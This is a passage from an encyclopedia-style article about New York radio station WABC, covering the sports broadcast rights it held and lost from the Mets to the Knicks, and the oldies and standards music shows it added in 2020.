Early in its Top 40 incarnation, WABC served as the original radio flagship of the New York Mets upon their establishment in 1962. A notable aspect of WABC&#x27;s Mets coverage was Howard Cosell and former Brooklyn Dodgers pitcher Ralph Branca handling the pre- and post-game shows. The station lost those rights to WHN following the 1963 season.

The Jets first called WABC home in the 1980s, but left toward the end of the decade for WCBS. The team would return to the station in 2000 after spending the previous seven seasons on WFAN. After then-sister station WEPN became the Jets&#x27; flagship, WABC began simulcasting the games over its airwaves due to its stronger signal. The arrangement ended in 2008 as WEPN began simulcasting all its programming on two other stations.

In December 2001, broadcast rights to the Yankees were lost after 21 years to WCBS. WABC also lost the radio rights to the Devils in 2005, as New Jersey&#x27;s hockey team moved to WFAN to substitute for the station&#x27;s loss of the New York Rangers to WEPN. WABC served as an overflow station for the Rangers from 2005 through 2009, and also served the same purpose for the New York Knicks when their games moved from WFAN to WEPN, but those rights moved to WNYM in 2009. The loss of evening sports programming has forced WABC to attempt to solidify its evening talk lineup.

===Music programming===
WABC announced on August 11, 2020, that it would be breaking with its all-talk format with an oldies music program, &quot;Cousin Brucie&#x27;s Saturday Night Rock &amp; Roll Party&quot;, beginning September 5, 2020. The weekly program features music from the 1950s—1960s with a splash from the 1970s, and is hosted by Bruce Morrow aka &quot;Cousin Brucie&quot;, who was a WABC disc jockey from 1961 to 1974.

In late October 2020, the station announced that it would add an additional two hours of pop/jazz/soul music after Morrow&#x27;s program, hosted by TV personality and singer Tony Orlando.

In December 2020, an additional music block was added on Sunday nights, this one featuring adult standards; Joe Piscopo hosts &quot;Sundays with Sinatra&quot;.
